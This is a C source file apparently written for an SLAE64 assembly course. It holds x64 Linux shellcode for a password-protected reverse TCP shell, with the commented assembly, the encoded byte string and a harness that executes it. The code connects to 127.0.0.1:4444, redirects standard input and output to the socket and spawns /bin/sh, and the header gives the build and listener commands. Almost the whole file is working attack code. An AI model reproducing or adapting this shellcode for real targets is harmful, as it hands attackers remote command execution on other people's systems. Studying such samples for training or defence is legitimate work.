/*---------------------------------------------------------------------------------------------------------------------
/*
*Title:            tcp reverse shell with password polymorphic version 122 bytes
*Author:           Sathish kumar
*Contact:          https://www.linkedin.com/in/sathish94
*Copyright:        (c) 2016 iQube. (http://iQube.io)
*Release Date:     January 29, 2016
*Description:      x64 Linux reverse TCP port shellcode on port 4444 with reconfigurable password
*Tested On:        Ubuntu 14.04 LTS
*SLAE64-1408
*Build/Run:        gcc -fno-stack-protector -z execstack filename.c -o filename
*                   ./bindshell
*                   nc -l 4444 -vvv
*


global _start

_start:

    xor rax, rax    ;Xor function will null the values in the register beacuse we doesn't know whats the value in the register in realtime cases
	xor rsi, rsi
	mul rsi
	add rcx, 0x3
	push byte 0x2   ;pusing argument to the stack
	pop rdi         ; poping the argument to the rdi instructions on the top of the stack should be remove first because stack LIFO
	inc esi         ; already rsi is 0 so incrementing the rsi register will make it 1
	push byte 0x29  ; pushing the syscall number into the rax by using stack
	pop rax
	syscall

	; copying the socket descripter from rax to rdi register so that we can use it further

	xchg rax, rdi

	; server.sin_family = AF_INET
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = INADDR_ANY
	; bzero(&server.sin_zero, 8)
	; setting up the data sctructure

	xor rax, rax
	push rax                         ; bzero(&server.sin_zero, 8)
	mov ebx , 0xfeffff80             ; ip address 127.0.0.1 "noted" to remove null
	not ebx
	mov dword [rsp-4], ebx
	sub rsp , 4                      ; adjust the stack
	push word 0x5c11                 ; port 4444 in network byte order
	push word 0x02                   ; AF_INET
	push rsp
	pop rsi


	push 0x10
	pop rdx
	push 0x2a
	pop rax
	syscall

	push 0x3
	pop rsi								; setting argument to 3



duplicate:
    dec esi
    mov al, 0x21                       ;duplicate syscall applied to error,output and input using loop
    syscall
    jne duplicate

password_check:

	push rsp
	pop rsi
	xor rax, rax   ; system read syscall value is 0 so rax is set to 0
	syscall
	push 0x6b636168 ; password to connect to shell is hack which is pushed in reverse and hex encoded
	pop rax
	lea rdi, [rel rsi]
	scasd           ; comparing the user input and stored password in the stack



execve:                                      ; Execve format  , execve("/bin/sh", 0 , 0)
     xor rsi , rsi
     mul rsi                                 ; zeroed rax , rdx register
     push ax                                 ; terminate string with null
     mov rbx , 0x68732f2f6e69622e            ; "/bin//sh"  in reverse order
     inc rbx
     add rcx, 2
     push rbx
     push rsp
     pop rdi                                 ; set RDI
     push byte 0x3b                          ; execve syscall number (59)
     pop rax
     syscall

*/
#include <stdio.h>
#include <string.h>

unsigned char code[] =\
"\x48\x31\xc0\x48\x31\xf6\x48\xf7\xe6\x48\x83\xc1\x03\x6a\x02\x5f\xff\xc6\x6a\x29\x58\x0f\x05\x48\x97\x48\x31\xc0\x50\xbb\x80\xff\xff\xfe\xf7\xd3\x89\x5c\x24\xfc\x48\x83\xec\x04\x66\x68\x11\x5c\x66\x6a\x02\x54\x5e\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\x54\x5e\x48\x31\xc0\x0f\x05\x68\x68\x61\x63\x6b\x58\x48\x8d\x3e\xaf\x48\x31\xf6\x48\xf7\xe6\x66\x50\x48\xbb\x2e\x62\x69\x6e\x2f\x2f\x73\x68\x48\xff\xc3\x48\x83\xc1\x02\x53\x54\x5f\x6a\x3b\x58\x0f\x05";
main()
{
   printf("Shellcode Length: %d\n", (int)strlen(code));
   int (*ret)() = (int(*)())code;
   ret();
}